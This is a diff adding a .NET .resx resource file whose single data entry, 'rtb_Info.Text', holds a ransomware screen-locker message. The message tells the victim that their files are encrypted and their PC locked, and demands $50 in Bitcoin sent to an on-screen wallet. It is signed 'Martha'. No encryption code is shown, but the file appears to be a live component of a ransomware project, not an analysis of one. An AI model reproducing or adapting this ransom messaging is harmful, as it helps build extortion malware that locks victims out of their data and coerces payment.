@@ -1,0 +1,54 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="rtb_Info.Text"><value>I know what you're thinking. "What happened?"
+Well, the answer is quite simple. Before I tell
+you, promise me you will not get mad. Okay. Your PC
+was victim of a Ransomware attack. That means
+every important file is now encrypted and you
+can't access them. Oh, and there is this screen
+locker too. You don't have access to your PC anymore.
+What a shame, huh?
+There is only one way to get your stuff back. $50.
+It isn't that much, cmon! I'll give you instructions
+on how to pay. Alright. To successfully pay the
+ransom and unlock all your sh*t, you will need Bitcoins.
+But wait, it is only 50 USD in Bitcoins, no worries.
+Nothing to worry about. You can buy it in the internet.
+Oh, and don't even Google "how to remove a ransomware"
+because it will not help. When buying Bitcoins you will
+need a wallet. You can create one at a website called
+Blockchain. Now find a way to buy 50 USD in BTC. Google is
+your friend. Then you must send the Bitcoins to the wallet
+specified in the right of the screen. After that, write
+your wallet inside that text box and finally click the button
+"I paid!". Wait some time until I confirm your payment and
+fix your files.
+- Martha</value></data>
+  </root>
